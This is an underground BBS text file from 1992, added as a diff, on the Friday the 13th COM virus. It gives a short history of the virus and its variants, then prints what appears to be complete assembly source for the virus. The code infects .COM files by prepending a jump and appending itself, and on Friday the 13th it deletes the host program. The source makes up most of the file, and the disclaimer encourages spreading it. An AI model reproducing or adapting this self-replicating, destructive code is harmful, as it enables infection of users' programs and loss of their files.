@@ -1,0 +1,382 @@
+
+
+><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+*********************************************************
+*                                                       *
+*           Viruses: Friday the Thirteenth              *
+*                                                       *
+*                                                       *
+*           Another Modernz Presentation                *
+*                                                       *
+*                        by                             *
+*                  Digital-demon                        *
+*                                                       *
+*            (C)opyright March 12th, 1992               *
+*                                                       *
+*********************************************************
+
+
+
+
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+                                                                                                                                                                                      
+                                                                                                                                                                                                                            
+
+
+
+       The original Friday The 13th COM virus first appeared in South
+       Africa in 1987.  Unlike the Jerusalem (Friday the 13th) viruses, it
+       is not memory resident, nor does it hook any interrupts.  This virus
+       only infects .COM files, but not COMMAND.COM.  On each execution of
+       an infected file, the virus looks for two other .COM files on the C:
+       drive and one on the A: drive, if found they are infected.  This virus
+       is extremely fast, and the only indication of propagation occurring is
+       the access light being on for the A: drive, if the current default drive
+       is C:.  The virus will only infect a .COM file once.  The files, after
+       infection, must be less than 64K in length.
+
+       On every Friday the 13th, if the host program is executed, it is
+       deleted.
+
+       Known variant(s) of Friday The 13th COM are:
+       Friday The 13th-B: same, except that it will infect every file in
+                          the current subdirectory or in the system path if
+                          the infected .COM program is in the system path.
+       Friday The 13th-C: same as Friday The 13th-B, except that the 
+                          message "We hope we haven't inconvenienced you"
+                          is displayed whenever the virus activates.
+       Friday The 13th-D: Friday The 13th-D was received in September,
+                          1991 from the NCSA.  This variant adds 418 to
+                          432 bytes to programs it infects.  It will infect
+                          all .COM programs, except COMMAND.COM, located in
+                          the current directory whenever an infected .COM
+                          program is executed.  Infected programs will 
+                          have had their date and time in the disk directory
+                          updated to the current system date and time when
+                          infection occurred.  The virus will be be
+                          located at the end of the infected file.  On
+                          Friday The 13ths, the virus will delete any
+                          infected program the user attempts to execute.
+       Friday The 13th-NZ: Received from Dr. Henry Wolfe of New Zealand
+                          in October, 1991, Friday The 13th-NZ is a minor
+                          variant of the Friday The 13th COM virus.  It
+                          infects all .COM files in the current directory
+                          when an infected program is executed, adding 623
+                          to 634 bytes to the file length.  The actual
+                          length of the viral code, however, is 350 bytes.
+
+--------------------------------------------------------------------------------
+The original 'Friday the 13th"
+Also called - Munich Virus, Miami Virus
+
+
+
+ 
+;-----------------------------------------------------------------------;
+; THE METHOD OF INFECTION:                           ;
+; SAVE FIRST 3 BYTES OF HOST TO SAVE AREA INSIDE OF VIRIUL SHELL     ;
+; APPEND VIRIUL SHELL TO END OF .COM FILE (ON A PARAGRAPH BOUNDARY!) ;
+;-----------------------------------------------------------------------;
+; ATTENTION!                                     ;
+; RESULTING FILE APPARENTLY MUST BE < 64K                            ;
+; REMEMBER THE STACK IS AT THE TOP OF THE 64K FILE! WHERE SHELL RESIDES   ;
+; STACK MUST HAVE ROOM FOR VIRUS USE                       ;
+;-----------------------------------------------------------------------;
+CODE     SEGMENT PUBLIC 'CODE'         ;
+    ASSUME    CS:CODE,DS:CODE,ES:CODE,SS:CODE
+                        ;
+    ORG  100H           ;SAME A .COM FILE FOR NOW
+                        ;
+    PUBLIC    HOST_SIZE      ;;
+                        ;
+;-----------------------------------------------------------------------;
+; JUMP AROUND VIRUS DATA AREA                              ;
+;-----------------------------------------------------------------------;
+BEGIN:   JMP  CONTINUE       ;
+                        ;
+;-----------------------------------------------------------------------;
+; SHELL DATA AREA APPARENTLY FOLLOWS                            ;
+;-----------------------------------------------------------------------;
+HOST_3        DB   ?,?,?          ;FIRST 3 BYTES OF HOST
+ID       DB   'INFECTED',0   ;FYI ALREADY INFECTED ID
+                        ;
+NEW_3         DB   0E9H      ;TO REPLACE FIRST 3 BYTES OF HOST
+OUR_BEGIN     DW   ?         ;
+                        ;
+HOST_TYPE     DB   '*.COM',0 ;TYPE OF FILES TO INFECT
+                        ;
+DTA      DB   21 DUP (?)     ;USED BY DOS
+         DB   ?         ;FILE ATTRIBUTE
+         DW   ?         ;FILES TIME
+         DW   ?         ;FILES DATE
+HOST_SIZE     DW   ?         ;FILE SIZE
+         DW   ?         ;FILE SIZE
+HOST_NAME     DB   13 DUP (?)     ;FILE NAME
+                        ;
+COMMAND_COM   DB   'COMMAND.COM',0     ;
+COMMAND_LENGTH     EQU  $ - offset COMMAND_COM
+                        ;
+;-----------------------------------------------------------------------;
+; SAVE INCOMMING ENVIRONMENT AND SETUP WORKING ENVIRONMENT      ;
+;-----------------------------------------------------------------------;
+CONTINUE:                    ;
+    PUSH CS             ;SAVE HOST SEGMENT
+    PUSH AX             ;SAVE SPACE FOR HOST offset
+                        ;
+    PUSH AX             ;SAVE INCOMMING REGs
+    PUSH BX             ;
+    PUSH CX             ;
+    PUSH DX             ;
+    PUSH SI             ;
+    PUSH DI             ;
+    PUSH BP             ;
+    PUSH DS             ;! NOT ES !
+                        ;
+    MOV  BP,SP               ;SAVE HOST offset (IN STACK)
+    MOV  word ptr [BP+16],100H    ;   (FOR LATER RETF TO HOST)
+                        ;
+    CALL DUMMY               ;MOV AX,IP
+DUMMY:   POP  AX             ;
+    SUB  AX,(offset DUMMY - offset BEGIN)
+                        ;
+    MOV  CL,4           ;PASS CONTROL TO OURSELF WITH IP=100H
+    SHR  AX,CL               ;
+    MOV  BX,CS               ;
+    ADD  AX,BX               ;
+    SUB  AX,10H              ;
+    PUSH AX             ;(OUR MODIFIED CS)
+    MOV  AX,offset IN_CONTROL     ;(OUR IP)
+    PUSH AX             ;
+    RETF                ;
+                        ;
+;-----------------------------------------------------------------------;
+;-----------------------------------------------------------------------;
+IN_CONTROL:                  ;
+    MOV  AX,CS               ;(INIT DS)
+    MOV  DS,AX               ;
+                        ;
+    CALL REPLICATE      ;
+    CALL DO_STUFF       ;DO STUFF HERE
+                        ;
+    JMP  ALL_DONE       ;PASS CONTROL TO HOST
+                        ;
+;-----------------------------------------------------------------------;
+; REPRODUCE                                 ;
+;-----------------------------------------------------------------------;
+REPLICATE:                   ;
+    PUSH ES             ;
+                        ;
+    PUSH DS             ;
+    POP  ES             ;
+                        ;
+    MOV  AH,1AH              ;SET DTA
+    MOV  DX,OFFSET DTA       ;
+    INT  21H            ;
+                        ;
+    MOV  AH,4EH              ;FIND FIRST
+    XOR  CX,CX               ;
+    MOV  DX,OFFSET HOST_TYPE ;
+    INT  21H            ;
+    JC   R_90           ;
+                        ;
+R_10:    CALL ATTACH              ;INFECT FOUND FILE
+                        ;
+    MOV  AH,4FH              ;FIND NEXT
+    INT  21H            ;
+    JNC  R_10           ;UNTIL NO MORE FOUND
+                        ;
+R_90:    POP  AX             ;
+    PUSH AX             ;
+                        ;
+    PUSH DS             ;
+    MOV  DS,AX               ;
+    MOV  AH,1AH              ;RESTORE DTA
+    MOV  DX,0080H       ;
+    INT  21H            ;
+    POP  DS             ;
+                        ;
+    POP  ES             ;
+    RET                 ;
+                        ;
+;-----------------------------------------------------------------------;
+;-----------------------------------------------------------------------;
+ATTACH:  PUSH ES             ;IF 'COMMAND.COM' ATTEMPTED...
+    MOV  AX,DS               ;
+    MOV  ES,AX               ;
+    MOV  SI,offset HOST_NAME ;
+    MOV  DI,offset COMMAND_COM    ;
+    MOV  CX,COMMAND_LENGTH   ;
+    CLD                 ;
+    REPE CMPSB               ;
+    POP  ES             ;
+    JNE  A_01           ;
+    JMP  A_99           ;...DONT INFECT IT
+                        ;
+A_01:    MOV  AX,3D02H       ;OPEN R/W
+    MOV  DX,offset HOST_NAME ;ie. '\COMMAND.COM'
+    INT  21H            ;
+    JNC  A_03           ;
+    JMP  A_90           ;
+                        ;
+A_03:    MOV  BX,AX               ;BX=HANDLE
+                        ;
+    PUSH word ptr [HOST_3]   ;SAVE
+    PUSH word ptr [HOST_3+2] ;SAVE
+                        ;
+    MOV  AH,3FH              ;READ FIRST 3 BYTES
+    MOV  CX,3           ;
+    MOV  DX,offset HOST_3    ;
+    INT  21H            ;
+    JC   A_80           ;
+                        ;
+    MOV  AL,[NEW_3]          ;IF ALREADY INFECTED...
+    CMP  [HOST_3],AL         ; (YOU CAN TELL BY THE JUMP INSTRUCTION
+    JNE  A_05           ;  AND BY THE SIZE OF THE JUMP)
+    MOV  AX,[HOST_SIZE]      ;
+    SUB  AX,(offset OUR_END - offset BEGIN)
+    SUB  AX,3           ;
+    CMP  word ptr [HOST_3+1],AX   ;
+    JE   A_85           ;...DONT INFECT AGAIN
+                        ;
+A_05:    MOV  AX,4202H       ;POINT TO THE END
+    XOR  CX,CX               ;
+    XOR  DX,DX               ;
+    INT  21H            ;
+    JC   A_80           ;
+                        ;
+    OR   AX,0FH              ;ROUND UP TO NEXT PARAGRAPH
+    INC  AX             ;
+    SUB  AX,3           ;(TAKE INTO ACOUNT JMP INSTRUCTION SIZ)
+    MOV  [OUR_BEGIN],AX      ;
+                        ;
+    MOV  AX,4200H       ;POINT TO FIRST 3 BYTES
+    XOR  CX,CX               ;
+    XOR  DX,DX               ;
+    INT  21H            ;
+    JC   A_80           ;
+                        ;
+    MOV  AH,40H              ;WRITE NEW 3 BYTES
+    MOV  CX,3           ;
+    MOV  DX,offset NEW_3          ;
+    INT  21H            ;
+    JC   A_80           ;
+                        ;
+;REMEMBER, WERE ALREADY POINTING PAST THE FIRST 3 BYTES!
+    MOV  AX,4201H       ;POINT TO END (ROUNDED UP TO PARA)
+    XOR  CX,CX               ;
+    MOV  DX,[OUR_BEGIN]      ;
+    INT  21H            ;
+    JC   A_80           ;
+                        ;
+    MOV  AH,40H              ;APPEND VIRUS TO END OF FILE
+    MOV  CX,(offset OUR_END - offset BEGIN)
+    MOV  DX,offset BEGIN          ;
+    INT  21H            ;
+    JC   A_80           ;
+                        ;
+    JMP  A_85           ;CLOSE AND RETURN
+                        ;
+A_80:    ;CALL     BEEP           ;
+                        ;
+A_85:    POP  word ptr [HOST_3+2] ;SAVE
+    POP  word ptr [HOST_3]   ;SAVE
+                        ;
+    MOV  AH,3EH              ;CLOSE FILE
+    INT  21H            ;
+                        ;
+A_90:    JNC  A_99           ;
+    ;CALL     BEEP           ;
+A_99:    RET                 ;
+                        ;
+;-----------------------------------------------------------------------;
+; DO STUFF                                       ;
+;-----------------------------------------------------------------------;
+DO_STUFF:                    ;
+    PUSH ES             ;
+                        ;
+    MOV  AH,2AH              ;GET DATE
+    INT  21H            ;
+                        ;
+    CMP  DL,13               ;IF FRIDAY THE 13th...
+    JNE  DS_90               ;
+    CMP  AL,5           ;
+    JNE  DS_90               ;
+                        ;
+    XOR  AX,AX               ;FIND OUT INFECTED NAME
+    MOV  CX,32767       ;
+    XOR  DI,DI               ;
+    MOV  ES,ES:[002CH]       ;
+    CLD                 ;
+    REPNE     SCASW               ;
+    JNE  DS_90               ;
+    ADD  DI,2           ;SKIP '01 00'
+                        ;
+    PUSH DS             ;DELETE SELF
+    PUSH ES             ;
+    POP  DS             ;
+    MOV  AH,41H              ;
+    MOV  DX,DI               ;
+    INT  21H            ;
+    POP  DS             ;
+                        ;
+DS_90:   POP  ES             ;
+    RET                 ;
+                        ;
+;-----------------------------------------------------------------------;
+; PASS CONTROL TO THE HOST PROGRAM                         ;
+;-----------------------------------------------------------------------;
+ALL_DONE:                    ;
+    MOV  AX,word ptr [HOST_3]     ;RESTORE HOSTS FIRST 3 BYTES
+    MOV  ES:[100H],AX        ;
+    MOV  AL,[HOST_3+2]       ;
+    MOV  ES:[102H],AL        ;
+                        ;
+    POP  DS             ;! NOT ES !
+    POP  BP             ;
+    POP  DI             ;
+    POP  SI             ;
+    POP  DX             ;
+    POP  CX             ;
+    POP  BX             ;
+    POP  AX             ;
+                        ;
+    RETF                ;
+                        ;
+OUR_END  LABEL     BYTE           ;
+                        ;
+CODE     ENDS                ;
+    END  BEGIN               ;
+
+
+
+
+|-|-|-|-|-|-|=|=|=|=|=|=|=|=|=|=|=|-|-|-|-|-|-|-|-|-|-|-|=|=|=|=|=|=|
+
+Disclaimer
+~~~~~~~~~~
+This publication is for informational purposes ONLY.
+In no way are the above authors, or organizations, liable for the
+use or misuse of the information contained herein. The Underground Agent
+Society Inc., The Agents Underground Notebooks, UASI, UASI Magazine, The
+Global Intelligence Center, and The Global Intelligence Underground are all
+unregistered trademarks of UASI. Distribution to EVERYWHERE is ENCOURAGED!
+Hellfire BBS, SANctuary Magazine, SANphilez, and SANsites are all
+unregistered trademarks of SANctuary. Matrix BBS, Modernz, and others are
+unregistered trademarks of Modernz. Distribution of these text files is
+allowed...and downright encouraged.
+
+|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|=|-|
+
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                                                                                                                                                           
+<*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*>
+<*>                                                                        <*>
+<*>  THIS HAS BEEN A MODERNZ PRESENTATION                                  <*>
+<*>                                                                        <*>
+<*>                             SEE YOU ALL AT MATRIX BBS (908)905-6691    <*>
+<*>                                                                        <*>
+<*>                NON-PURSUITABLE WITHOUT A GLOBAL                        <*>
+<*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*><*>
+ 
+                                    
